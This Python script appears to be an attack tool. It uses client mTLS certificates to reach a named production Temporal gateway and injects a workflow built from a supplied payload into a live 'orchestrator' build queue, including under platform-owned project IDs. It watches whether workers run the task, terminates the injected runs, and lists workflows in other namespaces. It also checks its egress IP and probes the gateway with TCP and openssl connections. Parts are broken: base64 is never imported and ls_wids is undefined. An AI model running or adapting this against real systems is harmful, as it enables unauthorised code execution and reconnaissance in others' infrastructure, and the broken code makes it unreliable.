#!/usr/bin/env python3
# I68052 act: Q2 (own ids) + Q1 (platform Station project ids) real-type injection into live
# "orchestrator" queue, observe WorkflowTaskStarted/Completed, terminate immediately + child cleanup.
import subprocess, struct, json, sys, os, time, re, uuid

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'
CRT = '/pki/client.crt'
KEY = '/pki/client.key'
TS = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
CTR = [0]
T = '/temporal.api.workflowservice.v1.WorkflowService/'
BUDGET = [56000]
NS = 'builds'
QUEUE = 'orchestrator'

OUR_P = '104cdfa2-f46b-45ed-b2b9-ec4db24b1b3f'
OUR_E = '6bd910b8-f1f5-43e5-b497-5bc2a4c55e3d'
OUR_S = '185f72a5-3373-41c1-982c-2af89c6e1191'
OUR_D = '6f3b362b-165d-4b7c-9f5e-4786513f4c7f'

PLAT_P = 'e766c469-fd0c-4a8c-99c9-d673de872294'
PLAT_E = '048a8d8c-b808-443d-ae9c-91b2f1595d85'
PLAT_S = '01abc7dd-5ef8-4537-a8ea-fd9c8c1c7116'


def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fv(f, n):
    return varint(f << 3) + varint(n)


def fb(f, b):
    return varint((f << 3) | 2) + varint(len(b)) + b


def fs(f, s):
    return fb(f, s.encode() if isinstance(s, str) else s)


def fmsg(f, m):
    return fb(f, m)


def rd_varint(b, i):
    r = 0
    s = 0
    while i < len(b):
        x = b[i]
        r |= (x & 0x7f) << s
        i += 1
        if not x & 0x80:
            return r, i
        s += 7
    raise ValueError('varint')


def parse(b):
    i = 0
    out = []
    while i < len(b):
        k, i = rd_varint(b, i)
        f = k >> 3
        w = k & 7
        if f == 0:
            raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i)
            out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b):
                raise ValueError('len')
            out.append((f, 2, b[i:i + l])); i += l
        elif w == 5:
            out.append((f, 5, b[i:i + 4])); i += 4
        elif w == 1:
            out.append((f, 1, b[i:i + 8])); i += 8
        else:
            raise ValueError('wt%d' % w)
    return out


def call(path, body=b'', timeout=25):
    CTR[0] += 1
    fu = '/tmp/w%d.bin' % CTR[0]
    hu = '/tmp/wh%d.txt' % CTR[0]
    bu = '/tmp/wb%d.bin' % CTR[0]
    open(fu, 'wb').write(b'\x00' + struct.pack('>I', len(body)) + body)
    args = ['curl', '-sS', '--http2', '--connect-timeout', '6', '-m', str(timeout), '-D', hu, '-o', bu,
            '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
            '-H', 'te: trailers', '-H', 'content-type: application/grpc', '--data-binary', '@' + fu]
    t0 = time.time()
    prc = subprocess.run(args, capture_output=True, text=True)
    dt = round(time.time() - t0, 2)
    if prc.returncode != 0 and BUDGET[0] > 0:
        print('CURL|rc=%s|%s' % (prc.returncode, (prc.stderr or '').strip()[:300]), flush=True)
    hdr = ''
    try:
        hdr = open(hu, 'rb').read().decode('utf-8', 'replace')
    except Exception:
        pass
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    msgs = re.findall(r'grpc-message:\s*([^\r\n]*)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    for f in (fu, hu, bu):
        try:
            os.unlink(f)
        except Exception:
            pass
    return {'st': (sts[-1] if sts else '-'), 'msg': (msgs[-1].strip()[:200] if msgs else ''),
            'n': len(data), 'data': data, 'dt': dt}


def payload(b):
    if len(b) >= 5 and b[0] == 0:
        l = struct.unpack('>I', b[1:5])[0]
        return b[5:5 + l]
    return b


def out(s):
    if BUDGET[0] <= 0:
        return
    s = s[:BUDGET[0]]
    BUDGET[0] -= len(s)
    print(s, flush=True)


def get1(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 2:
                return v
    except Exception:
        return None


def all_of(b, field):
    try:
        return [v for f, w, v in parse(b) if f == field and w == 2]
    except Exception:
        return []


def pl_strings(b, lim=260):
    try:
        return ' '.join(x.decode('utf-8', 'replace') for x in re.findall(rb'[\x20-\x7e]{4,}', b))[:lim]
    except Exception:
        return ''


def dur(sec):
    return fv(1, sec)  # Duration{seconds=sec} message bytes


def exec_msg(wid, rid=''):
    return fs(1, wid) + (fs(2, rid) if rid else b'')


def build_payload(js):
    meta = fmsg(1, fs(1, 'encoding') + fs(2, 'json/protobuf')) + \
           fmsg(1, fs(1, 'messageType') + fs(2, 'orchestrator.StartSnapshotAndBuildRequest'))
    return meta + fmsg(2, js)


def start_body(ns, wid, wtype, tq, inp, etime=180, rtime=300, wtime=30):
    data = json.dumps(inp).encode()
    b = fs(1, ns) + fs(2, wid) + fmsg(3, fs(1, wtype)) + fmsg(4, fs(1, tq))
    b += fmsg(5, fmsg(1, build_payload(data)))
    b += fmsg(6, dur(etime)) + fmsg(7, dur(rtime)) + fmsg(8, dur(wtime))
    b += fs(9, 'i68052-probe') + fs(10, str(uuid.uuid4())) + fv(11, 2)
    return b


def runid_of(r):
    if r['st'] != '0':
        return ''
    try:
        for f, w, v in parse(payload(r['data'])):
            if f == 1 and w == 2:
                return v.decode()
    except Exception:
        pass
    return ''


def hist_events(wid, rid):
    req = fs(1, NS) + fmsg(2, exec_msg(wid, rid)) + fv(3, 60)
    r = call(T + 'GetWorkflowExecutionHistory', req, timeout=25)
    if r['st'] != '0':
        return None, r
    pl = payload(r['data'])
    h = get1(pl, 1) or b''
    evs = all_of(h, 1)
    seq = []
    for ev in evs:
        et = [v for f, w, v in parse(ev) if f == 3 and w == 0]
        seq.append(et[0] if et else 0)
    return seq, r


def terminate(wid, rid, why):
    r = call(T + 'TerminateWorkflowExecution',
             fs(1, NS) + fmsg(2, exec_msg(wid, rid)) + fs(3, why) + fs(5, 'i68052') + fs(6, rid), timeout=25)
    out('TERM|%s|st=%s|m=%s' % (wid[:46], r['st'], r['msg']))
    return r


def list_new(pre_wids, label):
    body = fs(1, NS) + fv(2, 30)
    r = call(T + 'ListWorkflowExecutions', body, timeout=25)
    res = []
    if r['st'] != '0':
        out('LS|%s|st=%s' % (label, r['st']))
        return res
    pl = payload(r['data'])
    for ei in all_of(pl, 1):
        ex = get1(ei, 1) or b''
        wid = (get1(ex, 1) or b'').decode('utf-8', 'replace')
        rid = (get1(ex, 2) or b'').decode('utf-8', 'replace')
        ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
        if wid not in pre_wids:
            res.append({'wid': wid, 'rid': rid, 'type': ty})
    return res


def parent_of(wid, rid):
    req = fs(1, NS) + fmsg(2, exec_msg(wid, rid)) + fv(3, 20)
    r = call(T + 'GetWorkflowExecutionHistory', req, timeout=25)
    if r['st'] != '0':
        return ''
    h = get1(payload(r['data']), 1) or b''
    for ev in all_of(h, 1):
        sa = get1(ev, 6)
        if sa:
            pe = get1(sa, 3)
            if pe:
                return (get1(pe, 1) or b'').decode('utf-8', 'replace')
    return ''


def cleanup_children(pre_wids, markers, label, parent_wid):
    for e in list_new(pre_wids, label):
        try:
            req = fs(1, NS) + fmsg(2, exec_msg(e['wid'], e['rid'])) + fv(3, 20)
            r = call(T + 'GetWorkflowExecutionHistory', req, timeout=25)
            hit = ''
            txt = ''
            if r['st'] == '0':
                txt = payload(r['data']).decode('latin1')
                for mk in markers:
                    if mk in txt:
                        hit = mk
                        break
            par = parent_of(e['wid'], e['rid'])
            if par == parent_wid:
                out('CHILD|%s|type=%s|parent=OURS|marker=%s' % (e['wid'][:44], e['type'], hit[:20]))
                terminate(e['wid'], e['rid'], 'i68052 child cleanup (own parent)')
            elif hit:
                out('ORPHAN|%s|type=%s|marker=%s|NOT_TERMINATED' % (e['wid'][:40], e['type'], hit[:20]))
            else:
                out('NEWX|%s|type=%s|parent=%s' % (e['wid'][:40], e['type'], par[:30]))
        except Exception as ex:
            out('CHILDERR|%s|%r' % (e['wid'][:30], ex))


def submit_and_watch(tag, wid, wtype, inp, markers, watch=14):
    out('=== %s ===' % tag)
    r = call(T + 'StartWorkflowExecution', start_body(NS, wid, wtype, QUEUE, inp), timeout=30)
    out('START|%s|st=%s|m=%s|len=%d' % (tag, r['st'], r['msg'], r['n']))
    rid = runid_of(r)
    out('RUNID|%s' % rid)
    if not rid:
        out('  BODY|' + pl_strings(payload(r['data']), 300))
        return '', ''
    t0 = time.time()
    seq = []
    last = []
    while time.time() - t0 < watch:
        s, hr = hist_events(wid, rid)
        if s is not None and s != last:
            seq = s
            last = list(s)
            out('EV|%s|t=%.1f|%s' % (tag, time.time() - t0, ','.join(str(x) for x in s)))
            # stop once workflow task was started AND completed/failed (function executed), or activity started
            if (3 in s or 7 in s) and (4 in s or 6 in s or 8 in s or 9 in s or 10 in s):
                break
            if 3 in s and (time.time() - t0) > 6:
                break
        time.sleep(1.0)
    if seq and (3 in seq or 7 in seq):
        out('CONSUMED|%s|events=%s' % (tag, ','.join(str(x) for x in seq)))
    else:
        out('NOTCONSUMED|%s|events=%s' % (tag, ','.join(str(x) for x in seq)))
    # capture tail strings for failure text
    s, hr = hist_events(wid, rid)
    if hr and hr['st'] == '0':
        out('  TAIL|' + pl_strings(payload(hr['data']), 420))
    time.sleep(1.0)
    terminate(wid, rid, 'i68052 %s cleanup' % tag)
    time.sleep(0.7)
    s2, hr2 = hist_events(wid, rid)
    out('POSTTERM|%s|events=%s' % (tag, ','.join(str(x) for x in (s2 or []))))
    cleanup_children(PRE[0], markers, tag, wid)
    return wid, rid


# ---------------- I68930 main ----------------
import socket
print('===I68930 START=== ' + TS, flush=True)
print('I68930-v2', flush=True)
out('host=%s' % subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip())
out('kernel=%s' % subprocess.run(['uname','-r'], capture_output=True, text=True).stdout.strip())
try:
    ip=subprocess.run(['curl','-sS','-m','8','https://api.ipify.org'],capture_output=True,text=True).stdout.strip()
    out('EGRESS_IP|%s' % ip)
except Exception as ex:
    out('EGRESS_IP_ERR|%r' % (ex,))
try:
    sk=socket.create_connection(('35.247.70.7',443),timeout=6); sk.close(); out('TCP|35.247.70.7:443|OPEN')
except Exception as ex:
    out('TCP|35.247.70.7:443|FAIL|%r' % (ex,))
for f in (CA, CRT, KEY):
    try:
        out('PKI|%s|len=%d|head=%s' % (f, os.path.getsize(f), open(f).readline().strip()[:40]))
    except Exception as ex:
        out('PKI|%s|ERR|%r' % (f, ex))
try:
    osr = subprocess.run(['openssl','s_client','-connect','35.247.70.7:443','-servername',
                          'external-mtls-service-gateway-us-west1.gcp.production.rlwy.net',
                          '-CAfile', CA, '-cert', CRT, '-key', KEY, '-brief'],
                         input='', capture_output=True, text=True, timeout=25)
    t = (osr.stdout or '') + (osr.stderr or '')
    out('SSLC|rc=%s|%s' % (osr.returncode, ' / '.join(x.strip() for x in t.strip().splitlines()[:8])[:400]))
except Exception as ex:
    out('SSLC_ERR|%r' % (ex,))
r = call(T + 'GetSystemInfo', timeout=25)
out('CTL|GetSystemInfo|st=%s|m=%s|%s' % (r['st'], r['msg'], pl_strings(payload(r['data']), 80)))

if r['st'] != '0':
    out('GATEWAY_UNREACHABLE|no injection')
else:
    out('GATEWAY_OK|proceeding')
    PL=os.environ.get('I68930_PAYLOAD_B64','')
    try:
        raw=base64.b64decode(PL) if PL else b'{}'
    except Exception:
        raw=b'{}'
    try:
        pj=json.loads(raw)
    except Exception:
        pj={}
    out('PAYLOAD_KEYS|' + ','.join(sorted(pj.keys())))
    PRE=[ls_wids()]
    out('PRE_EXECS=%d' % len(PRE[0]))
    wid='i68930-inject-'+TS
    submit_and_watch('INJECT', wid, 'ScheduleSnapshotAndBuild', pj, [OUR_P, OUR_S], watch=90)
    # targeted only-read listings
    for ns,lab in (('vm-runtime','VMRT'),('storage_production_oyq1d','STOYQ')):
        body = fs(1, ns) + fv(2, 25)
        rr = call(T + 'ListWorkflowExecutions', body, timeout=25)
        n=0; types={}
        if rr['st']=='0':
            for ei in all_of(payload(rr['data']), 1):
                n+=1
                ty=(get1(get1(ei,2) or b'',1) or b'').decode('utf-8','replace')
                types[ty]=types.get(ty,0)+1
        out('LS|%s|st=%s|n=%d|types=%s' % (lab, rr['st'], n, json.dumps(types)[:300]))
out('===I68930 END===')
